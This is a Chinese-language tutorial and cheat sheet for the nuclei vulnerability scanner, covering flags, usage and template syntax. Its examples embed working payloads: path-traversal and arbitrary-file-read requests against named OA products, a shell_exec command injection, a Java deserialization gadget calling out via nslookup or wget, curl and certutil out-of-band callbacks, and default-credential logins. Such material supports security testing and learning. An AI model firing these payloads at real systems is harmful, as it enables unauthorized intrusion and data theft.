---
title: nuclei
createTime: 2024/10/16 20:20:40
permalink: /learn/2t2dygtd/
---

# nuclei

`非常优秀的漏洞扫描工具,值得学习!`

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**

- [projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei)

**语法规则**

- https://nuclei.projectdiscovery.io/templating-guide
- https://nuclei.projectdiscovery.io/template-examples/http/

**模板库**

- [projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) - 由社区维护的 POC 库
- [0xAwali/Blind-SSRF](https://github.com/0xAwali/Blind-SSRF)

**相关文章**

- [安利一款还不错的开源工具—Nuclei](https://mp.weixin.qq.com/s/C_-FRZMqF4ifzlx-ij4iIQ)
- [projectdiscovery 之 nuclei 源码阅读](https://mp.weixin.qq.com/s/zedeOp8ywOohqogCOWTpbA)
- [Automate Cache Poisoning Vulnerability - Nuclei](https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning)
- [Exploiting Race conditions with Nuclei](https://blog.projectdiscovery.io/exploiting-race-conditons/)
- [Writing Network Templates with Nuclei](https://blog.projectdiscovery.io/writing-network-templates-with-nuclei/)

---

## 安装及维护

**安装**

- 二进制文件安装

  1. 从 Releases 页面下载已经构建好的二进制文件压缩包

  ```bash
  tar -xzvf nuclei-linux-amd64.tar.gz
  mv nuclei /usr/local/bin/
  nuclei -version
  ```

- 源码安装

  ```bash
  GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
  ```

- 编译安装

  ```bash
  git clone https://github.com/projectdiscovery/nuclei.git; cd nuclei/v2/cmd/nuclei/; go build; mv nuclei /usr/local/bin/; nuclei -version
  ```

- 基于 docker
  ```bash
  docker pull projectdiscovery/nuclei
  docker run -it projectdiscovery/nuclei
  ```

**模板库更新**

该命令会从 https://github.com/projectdiscovery/nuclei-templates 模板库中下载最新版本

```
nuclei -update-templates
```

**命令参数**

| 命令                   | 描述                               | 例子                                            |
| ---------------------- | ---------------------------------- | ----------------------------------------------- |
| bulk-size              | 每个模板最大并行的主机数 (默认 25) | nuclei -bulk-size 25                            |
| burp-collaborator-biid | 使用 burp-collaborator 插件        | nuclei -burp-collaborator-biid XXXX             |
| c                      | 并行的最大模板数量 (默认 10)       | nuclei -c 10                                    |
| l                      | 对 URL 列表进行测试                | nuclei -l urls.txt                              |
| target                 | 对目标进行测试                     | nuclei -target hxxps://example.com              |
| t                      | 要检测的模板种类                   | nuclei -t git-core.yaml -t cves/                |
| no-color               | 输出不显示颜色                     | nuclei -no-color                                |
| no-meta                | 不显示匹配的元数据                 | nuclei -no-meta                                 |
| json                   | 输出为 json 格式                   | nuclei -json                                    |
| include-rr             | json 输出格式中包含请求和响应数据  | nuclei -json -include-rr                        |
| o                      | 输出为文件                         | nuclei -o output.txt                            |
| project                | 避免发送相同的请求                 | nuclei -project                                 |
| stats                  | 使用进度条                         | nuclei -stats                                   |
| silent                 | 只输出测试成功的结果               | nuclei -silent                                  |
| retries                | 失败后的重试次数                   | nuclei -retries 1                               |
| timeout                | 超时时间 (默认为 5 秒)             | nuclei -timeout 5                               |
| trace-log              | 输出日志到 log 文件                | nuclei -trace-log logs                          |
| rate-limit             | 每秒最大请求数 (默认 150)          | nuclei -rate-limit 150                          |
| severity               | 根据严重性选择模板                 | nuclei -severity critical,high                  |
| stop-at-first-match    | 第一次匹配不要处理 HTTP 请求       | nuclei -stop-at-frst-match                      |
| exclude                | 排除的模板或文件夹                 | nuclei -exclude panels -exclude tokens          |
| debug                  | 调试请求或者响应                   | nuclei -debug                                   |
| update-templates       | 下载或者升级模板                   | nuclei -update-templates                        |
| update-directory       | 选择储存模板的目录 (可选)          | nuclei -update-directory templates              |
| tl                     | 列出可用的模板                     | nuclei -tl                                      |
| templates-version      | 显示已安装的模板版本               | nuclei -templates-version                       |
| v                      | 显示发送请求的详细信息             | nuclei -v                                       |
| version                | 显示 nuclei 的版本号               | nuclei -version                                 |
| proxy-url              | 输入代理地址                       | nuclei -proxy-url hxxp://127.0.0.1:8080         |
| proxy-socks-url        | 输入 socks 代理地址                | nuclei -proxy-socks-url socks5://127.0.0.1:8080 |
| H                      | 自定义请求头                       | nuclei -H "x-bug-bounty:hacker"                 |

---

## 使用

**运行单个模板**

对 urls.txt 中所有的主机运行 git-core.yaml 并返回结果到 results.txt

这将对 `urls.txt` 中所有的主机运行 `git-core.yaml` 并返回结果到 `results.txt`

```bash
nuclei -l urls.txt -t files/git-core.yaml -o results.txt
```

你可以轻松的通过管道使用标准的输入 (STDIN) 传递 URL 列表。

```bash
cat urls.txt | nuclei -t files/git-core.yaml -o results.txt
```

Nuclei 可以接受如下列表的 URL 作为输入，例如以下 URL：

```
https://test.some-site.com
http://vuls-testing.com
https://test.com
```

**运行多个模板**

这将会对 `urls.txt` 中所有的 URL 运行 `cves` 和 `files` 模板检查，并返回输出到 `results.txt`

```bash
nuclei -l urls.txt -t cves/ -t files/ -o results.txt
```

**组合运行**

```bash
subfinder -d hackerone.com -silent | httpx -silent | nuclei -t cves/ -o results.txt
```

**docker 调用**

对 `urls.txt` 中的 URL 通过 docker 中的 nuclei 进行检测，并将结果输出到本机的 `results.txt` 文件：

```
cat urls.txt | docker run -v /path/to/nuclei-templates:/app/nuclei-templates -v /path/to/nuclei/config:/app/.nuclei-config.json -i projectdiscovery/nuclei -t /app/nuclei-templates/files/git-config.yaml > results.txt
```

> 记得更改本机的模板路径

---

## 使用优化

**速率限制**

Nuclei 有多种控制速率的方法，包括并行执行多个模板、并行检查多个主机，以及使 nuclei 限制全局的请求速率，下面就是示例。

- `-c` 参数 - 限制并行的模板数
- `-bulk-size` 参数 - 限制并行的主机数
- `-rate-limit` 参数 - 全局速率限制

如果你想快速扫描或者控制扫描，请使用这些标志并输入限制数，`速率限制` 只保证控制传出的请求，与其他参数无关。

**排除模板**

[Nuclei 模板](https://github.com/projectdiscovery/nuclei-templates) 包含多种检查，其中有许多对攻击有用的检查，但并不是都有用的。如果您只希望扫描少数特定的模板或目录，则可以使用如下的参数筛选模板，或将某些模板排除。

- **排除模板运行**

  我们不建议同时运行所有的 nuclei 模板，如果要排除模板，可以使用 `exclude` 参数来排除特定的目录或模板。

  ```bash
  nuclei -l urls.txt -t nuclei-templates -exclude panels/ -exclude technologies -exclude files/wp-xmlrpc.yaml
  ```

  注意：如上述示例中显示的那样，目录和特定模板都将不会扫描

- **基于严重性运行模板**

  您可以根据模板的严重性运行模板，扫描时可以选择单个严重性或多个严重性。

  ```bash
  nuclei -l urls.txt -t cves/ -severity critical,medium
  ```

  上面的例子将运行 `cves` 目录下所有 `严重` 和 `中等` 的模板。

  ```bash
  nuclei -l urls.txt -t panels/ -t technologies -severity info
  ```

  上面的例子将运行 `panels` 和 `technologies` 目录下严重性标记为 `info` 的模板

- **使用 `.nuclei-ignore` 文件排除模板**

  自从 nuclei 的 [v2.1.1 版本](https://github.com/projectdiscovery/nuclei/releases/tag/v2.1.1) 以来，我们添加了对 `.nuclei-ignore` 文件的支持，该文件与 `update-templates` 参数一起使用，在 **.nuclei-ignore** 文件中，您可以定义要从 nuclei 扫描中排除的所有模板目录或者模板路径，要开始使用此功能，请确保使用 `nuclei-update-templates` 参数安装 nuclei 模板，现在可以根据 `.nuclei-ignore` 的文件来添加、更新、删除模板文件。

  ```
  nano ~/nuclei-templates/.nuclei-ignore
  ```

  默认的 nuclei 忽略列表可以访问 [这里](https://github.com/projectdiscovery/nuclei-templates/blob/master/.nuclei-ignore) ，如果不想排除任何内容，只需要删除 `.nuclei-ignore` 文件。

**挂代理**

```bash
nuclei -l xxx.txt -t xxx.yaml -proxy-url http://192.168.1.1:8080
```

**调试**

```bash
nuclei -l xxx.txt -t xxx.yaml -v -duc
nuclei -l xxx.txt -t xxx.yaml -debug -duc
nuclei -l xxx.txt -t xxx.yaml -debug-req -duc
```

**其他**

```bash
# 断网环境
# -ni -stats -si 20 -rate-limit 500 -timeout 3

# 报错跳过(2.5.0 开始支持)
# -max-host-error 10

# 速率
# -rate-limit 500

# 超时时间
# -timeout 3

# 不更新
# -duc

# 无网络环境下
# -ni

# 监控
# -stats -si 60

# 无颜色
# -nc
```

**file**

```bash
nuclei -duc -t test.yaml -target log/
nuclei -duc -t test.yaml -target ./target1.txt -debug
```

**workflow**

```bash
nuclei -l xxx.txt -w xxx.yaml -duc
```

---

## 模板语法总结

---

**保留字**

```yaml
{{Hostname}}    # 最常用的
{{randstr}}     # 随机字符串

{{BaseURL}}     # https://example.com:443/foo/bar.php
{{RootURL}}     # https://example.com:443
{{Hostname}}	# example.com:443
{{Host}}	    # example.com
{{Port}}	    # 443
{{Path}}	    # /foo
{{File}}	    # bar.php
{{Scheme}}	  # https
```

---

## 基础模板

**ffffffff0x 风格**

```yaml
id: base

info:
  name: base
  author: ffffffff0x
  description: |
    FOFA: (body="Blue Iris Login") && (is_honeypot=false && is_fraud=false)
  severity: info
  reference: https://www.exploit-db.com/ghdb/6814
  tags: detect

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<title>Blue Iris Login</title>"
        part: body
        condition: and

      - type: word
        words:
          - "text/xml"
        part: header

      - type: status
        status:
          - 200
```

**官方风格**

```yaml
id: cwp-webpanel

info:
  name: CWP WebPanel
  author: ffffffff0x
  severity: info
  metadata:
    fofa-query: title=="CWP |用户"
  tags: panel,cwp

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

    redirects: true
    max-redirects: 2
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Login | CentOS WebPanel"
          - "CWP |用户"
          - "http://centos-webpanel.com"
          - "CentOS WebPanel"
        condition: or

      - type: word
        part: header
        words:
          - "cwpsrv"
```

---

### 开头

```yaml
id: landray-oa-fileread

info:
  name: landray-oa-fileread
  author: ffffffff0x
  severity: high
  description: |
    蓝凌OA custom.jsp 任意文件读取漏洞,这个OA遇到的比较少
    FOFA: app="Landray-OA系统"
  reference: https://github.com/chaitin/xray/pull/1213
  tags: fileread,landray
```

---

### 请求

#### Get

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
```

#### POST

```yaml
requests:
  - method: POST
    path:
      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'var={"body":{"file":"file:///etc/passwd"}}'
```

#### RAW

```yaml
requests:
  - raw:
      - |
        POST /ispirit/interface/gateway.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        json={"url":"/general/../../mysql5/my.ini"}
```

#### 跳转

```yaml
- method: GET
  path:
    - "{{BaseURL}}"
  redirects: true
  max-redirects: 2
```

#### stop-at-first-match

Same support as we have via flag using -stop-at-first-match flag, will be helpful for the case where we have multiple possible paths for same file, in cases where we found matches at the start, we can avoid making additional requests.

大意就是一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描,当然这个不会影响其他模板.

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/main"
      - "{{BaseURL}}/index"

    stop-at-first-match: true
```

#### OOB

自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描。就像 `{{interactsh-url}}` 在请求中的任何位置编写并为添加匹配器一样简单 interact_protocol。Nuclei 将处理交互作用与模板的相关性，以及通过允许轻松进行 OOB 扫描而生成的请求的相关性。

```yaml
requests:
  - raw:
      - |
        GET /plugins/servlet/oauth/users/icon-uri?consumerUri=https://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
```

**linux**

```bash
curl https://{{interactsh-url}}
```

**windows**

```bash
certutil.exe -urlcache -split -f https://{{interactsh-url}} 1.txt
```

```yaml
matchers:
  - type: word
    part: interactsh_protocol # Confirms the HTTP Interaction
    words:
      - "http"
```

```yaml
matchers-condition: and
matchers:
  - type: word
    part: interactsh_protocol # Confirms the HTTP Interaction
    words:
      - "http"

  - type: regex
    part: interactsh_request # Confirms the retrieval of etc/passwd file
    regex:
      - "root:.*:0:0"
```

#### JAVA 反序列化

```yaml
raw:
  - |
    POST /index.faces;jsessionid=x HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Content-Length: 1882
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    javax.faces.ViewState={{generate_java_gadget("commons_collection3.1", "nslookup {{interact.sh}}", "base64")}}
```

- https://nuclei.projectdiscovery.io/templating-guide/helper-functions/#deserialization-helper-functions

---

#### 读取大小

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}/thumbs.db"
      - "{{BaseURL}}/.svn/wc.db"

    max-size: 500 # Size in bytes - Max Size to read from server response
    matchers-condition: and
    matchers:
      - type: binary
        binary:
          - "D0CF11E0" # db
          - "53514C69746520" # SQLite
        part: body
        condition: or

      - type: status
        status:
          - 200
```

---

#### skip-variables-check

what if my payload contains {{payload here}} and that is not cli env var. Can i escape it or somehow disable nuclei vars detection ?

当你的请求内容里包含 `{{` 时,会被 nuclei 解析为变量,加这个就是告诉 nuclei 不要解析.

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"

    skip-variables-check: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

---

### 匹配

```yaml
matchers-condition: and
matchers:
  - type: word
    words:
      - "http://crm.bd.itf.nc/ICustomerExportToCrmService"
      - "nc.itf.bd.crm"
    part: body
    condition: and

  - type: word
    words:
      - "text/xml"
    part: header

  - type: status
    status:
      - 200
```

**匹配时间**

```yaml
# 此模板是基于DSL的持续时间匹配器的示例，当响应时间与定义的持续时间（在这种情况下为6或大于6秒）匹配时，返回true。
matchers:
  - type: dsl
    dsl:
      - "duration>=6"
```

**重命名**

```yaml
matchers:
  - type: word
    encoding: hex
    name: win2000
    words:
      - "0300000b06d00000123400"
  - type: word
    encoding: hex
    name: win2003
    words:
      - "030000130ed000001234000300080002000000"
  - type: word
    encoding: hex
    name: win2008
    words:
      - "030000130ed000001234000200080002000000"
```

**匹配大小**

```yaml
matchers:
  - type: dsl
    dsl:
      - "len(body)<130 && status_code==200"
```

**提取器**

```yaml
extractors:
  - type: regex
    part: body
    name: version
    group: 2
    regex:
      - "(<h3>)(.*?)(</h3>)"
```

**提取器案例 2**

```yaml
# {"execution_date":"2021-06-05T15:42:39+00:00","message":"Created <DagRun example_trigger_target_dag @ 2021-06-05 15:42:39+00:00: manual__2021-06-05T15:42:39+00:00, externally triggered: True>"}

extractors:
  - type: regex
    name: exec_date
    part: body
    group: 1
    internal: true
    regex:
      - '"execution_date":"([0-9-A-Z:+]+)"'
# 上面这段将提取出 2021-06-05T15:42:39+00:00

# 详见 CVE-2020-11978 写法
```

**提取器案例 3**

```yaml
extractors:
  - type: regex
    part: body
    regex:
      - "(<sup>)(.*?)(</sup>)"
```

**非**

以下是使用否定条件的示例语法，这将返回响应 header 中没有 phpsessID 的所有 URL。

```yaml
matchers:
  - type: word
    words:
      - "PHPSESSID"
    part: header
    negative: true
```

一个简单的判断蜜罐的示例

```yaml
- type: word
  words:
    - "荣耀立方"
    - 'var model = "LW-N605R"'
    - "password"
    - "success"
    - "tomcat"
  part: body
  negative: true
  condition: and
```

**Dynamic variabe**

```yaml
- method: POST
  path:
    - "{{BaseURL}}/login.php"

  body: "username=admin&password=password&Login=Login&user_token={{session}}"

  matchers:
    - type: kval
      name: session
      internal: true
      part: body
      kval:
        - PHPSESSID
```

---

### 爆破

**pitchfork**

```yaml
id: dell-idrac-default-login
info:
  name: Dell iDRAC6/7/8 Default login
  author: kophjager007
  severity: high
  tags: dell,idrac,default-login

requests:
  - method: POST
    path:
      - "{{BaseURL}}/data/login"

    body: "user={{username}}&password={{password}}"

    headers:
      Content-Type: "application/x-www-form-urlencode"
      Referer: "{{BaseURL}}/login.html"

    attack: pitchfork
    payloads:
      username:
        - root

      password:
        - calvin

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<authResult>0</authResult>"
```

---

### 常用匹配

**etc/passwd**

```yaml
- type: regex
  regex:
    - "root:.*:0:0:"
  part: body
```

**c:/windows/win.ini**

```yaml
- type: regex
  regex:
    - "bit app support"
```

**windows 回显**

```
cmd.exe /c set /a 12333*32111

396024963
```

**linux 回显**

```
expr 12333 \* 32111

396024963
```

---

### 进阶用法

#### 全局请求头

当目标采用 Basic Auth , 可以直接在调用的命令中加上全局请求头,而不用修改每个模板

```
nuclei -u https://target.com -H "Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ=="
```

#### Reusing dynamically extracted values as iterators in http request

- https://github.com/projectdiscovery/nuclei/pull/1288

对 robots.txt 内容进行抓取并运用于下一个请求

```yaml
id: valid-robotstxt-endpoints

info:
  name: Iterate robots.txt and request endpoints
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET /robots.txt HTTP/1.1
        Host: {{Hostname}}

      - |
        GET {{endpoint}} HTTP/1.1
        Host: {{Hostname}}

    iterate-all: true
    extractors:
      - part: body
        name: endpoint
        internal: true
        type: regex
        regex:
          - "(?m)/([a-zA-Z0-9-_/\\\\]+)"

    matchers:
      - type: status
        status:
          - 200
```

#### help_functions

```yaml
id: helper-functions-examples

info:
  name: RAW Template with Helper Functions
  author: pdteam
  severity: info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        01: {{base64("Hello")}}
        02: {{base64(1234)}}
        03: {{base64_decode("SGVsbG8=")}}
        04: {{base64_py("Hello")}}
        05: {{contains("Hello", "lo")}}
        06: {{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
        07: {{gzip("Hello")}}
        08: {{hex_decode("6161")}}
        09: {{hex_encode("aa")}}
        10: {{html_escape("<body>test</body>")}}
        11: {{html_unescape("&lt;body&gt;test&lt;/body&gt;")}}
        12: {{len("Hello")}}
        13: {{len(5555)}}
        14: {{md5("Hello")}}
        15: {{md5(1234)}}
        16: {{mmh3("Hello")}}
        17: {{print_debug(1+2, "Hello")}}
        18: {{rand_base(5, "abc")}}
        19: {{rand_base(5)}}
        20: {{rand_char("abc")}}
        21: {{rand_char()}}
        22: {{rand_int(1, 10)}}
        23: {{rand_int(10)}}
        24: {{rand_int()}}
        25: {{rand_text_alpha(10, "abc")}}
        26: {{rand_text_alpha(10)}}
        27: {{rand_text_alphanumeric(10, "ab12")}}
        28: {{rand_text_alphanumeric(10)}}
        29: {{rand_text_numeric(10, 123)}}
        30: {{rand_text_numeric(10)}}
        31: {{regex("H([a-z]+)o", "Hello")}}
        32: {{remove_bad_chars("abcd", "bc")}}
        33: {{repeat("../", 5)}}
        34: {{replace("Hello", "He", "Ha")}}
        35: {{replace_regex("He123llo", "(\\d+)", "")}}
        36: {{reverse("abc")}}
        37: {{sha1("Hello")}}
        38: {{sha256("Hello")}}
        39: {{to_lower("HELLO")}}
        40: {{to_upper("hello")}}
        41: {{trim("aaaHelloddd", "ad")}}
        42: {{trim_left("aaaHelloddd", "ad")}}
        43: {{trim_prefix("aaHelloaa", "aa")}}
        44: {{trim_right("aaaHelloddd", "ad")}}
        45: {{trim_space("  Hello  ")}}
        46: {{trim_suffix("aaHelloaa", "aa")}}
        47: {{unix_time(10)}}
        48: {{url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")}}
        49: {{url_encode("https://projectdiscovery.io/test?a=1")}}
        50: {{wait_for(1)}}
```

#### 嵌套表达式

```
❌ {{urldecode({{base64_decode('SGVsbG8=')}})}}
✔ {{url_decode(base64_decode('SGVsbG8='))}}
```

在 extractor 中使用

- https://github.com/projectdiscovery/nuclei/discussions/1622

```
{{url_decode(base64_decode('{{SGVsbG8=}}'))}}
```

#### self-contained

A new attribute to HTTP requests that marks all the HTTP Requests in that template as self-sufficient, meaning they do not require any input to be executed.

这个用的比较局限,一般就是用于批量检测 API 可用性的,举个例子,你通过信息泄露获得了一个 API_Key 但你不知道这个是哪个服务的 APIkey,没有特征,那么就只能找哪些官方 API 接口一个一个试,看哪一个平台可以生效,就是这个意思。

国内环境用的不多,我对这块也没研究过.

- https://blog.projectdiscovery.io/nuclei-v2-5-3-release/

```yaml
id: example-self-contained-input

info:
  name: example-self-contained
  author: pdteam
  severity: info

self-contained: true
requests:
  - raw:
      - |
        GET https://example.com:443/gg HTTP/1.1
        Host: example.com:443

    matchers:
      - type: status
        status:
          - 302
```

#### 文件协议

The default file size of the file template read is 1GB

文件模板默认读取的文件大小 1GB

- https://github.com/projectdiscovery/nuclei/pull/1577

```yaml
file:
  - extensions:
      - all

    extractors:
      - type: regex
        regex:
          - '"type": "service_account"'
```

#### 网络层

```yaml
network:
  - host:
      - "{{Hostname}}"
      - "{{Host}}:22"

    inputs:
      - data: "\n"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - 'SSH\-([0-9.-A-Za-z_ ]+)'

      - type: word
        words:
          - Invalid SSH identification string
```

#### 自定义模版变量

自 2.6.9 版本开始支持

```yaml
variables:
  a1: "{{to_lower(rand_base(5))}}"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?test={{a1}}"

    matchers:
      - type: word
        words:
          - "{{a1}}"
```

---

### 需要验证的问题

- 多个工作流模板之间是否可以进行请求合并
  - 截至 2.5.4 支持了单个工作流模板的请求合并,多个工作流模板的请求合并并不支持
  - https://github.com/projectdiscovery/nuclei/issues/1379
    - 2.8 疑似已解决(并没有 😢)
- 对于网络层的探测是否可以通过调用外部库来获得结果
  - issue 里官方有提,但目前没有进一步计划
  - 想要参考 fapro
  - https://github.com/projectdiscovery/network-fingerprint
- 值的管道用法
  - 单模板内可传递,多模板之间不可传递
- BS 版本 nuclei/api
  - 目前不支持
